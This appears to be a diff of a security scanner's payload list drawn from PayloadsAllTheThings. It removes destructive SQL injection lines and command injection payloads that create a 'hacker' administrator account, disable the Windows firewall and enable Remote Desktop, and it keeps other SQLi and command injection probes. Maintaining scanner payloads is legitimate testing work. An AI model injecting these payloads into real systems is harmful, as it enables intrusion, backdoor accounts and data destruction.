@@ -1,5 +1,5 @@
 # WScan Community Payloads
-# 取得日時 (UTC): 2026-06-07T18:20:24+00:00
+# 取得日時 (UTC): 2026-06-07T18:35:46+00:00
 # 出典:
 # - https://github.com/swisskyrepo/PayloadsAllTheThings
 # 各上流リポジトリの LICENSE に従って利用してください。
@@ -375,8 +375,6 @@ sqli:
 - ORDER BY 31337
 - RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
 - RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
-- IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
-- IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
 - '%'' AND 8310=8310 AND ''%''='''
 - '%'' AND 8310=8311 AND ''%''='''
 - and (select substring(@@version,1,1))='X'
@@ -624,16 +622,6 @@ os:
 - \n
 - \n/bin/ls -al\n
 - \necho INJECTX\nexit\n\033[2Asleep 5\n
-- '| net localgroup Administrators hacker /ADD'
-- ; net localgroup Administrators hacker /ADD
-- '& net localgroup Administrators hacker /ADD'
-- '&& net localgroup Administrators hacker /ADD'
-- net localgroup Administrators hacker /ADD
-- '| netsh firewall set opmode disable'
-- ; netsh firewall set opmode disable
-- '& netsh firewall set opmode disable'
-- '&& netsh firewall set opmode disable'
-- netsh firewall set opmode disable
 - netstat
 - ;netstat -a;
 - '| netstat -an'
@@ -641,11 +629,6 @@ os:
 - '& netstat -an'
 - '&& netstat -an'
 - netstat -an
-- '| net user hacker Password1 /ADD'
-- ; net user hacker Password1 /ADD
-- '& net user hacker Password1 /ADD'
-- '&& net user hacker Password1 /ADD'
-- net user hacker Password1 /ADD
 - '| net view'
 - ; net view
 - '& net view'
@@ -705,16 +688,6 @@ os:
 - '& pwd'
 - '&& pwd'
 - \r
-- '| reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
-  /t REG_DWORD /d 0 /f'
-- ; reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
-  /t REG_DWORD /d 0 /f
-- '& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
-  /t REG_DWORD /d 0 /f'
-- '&& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
-  /t REG_DWORD /d 0 /f'
-- reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
-  /t REG_DWORD /d 0 /f
 - \r\n
 - route
 - '| sleep 1'
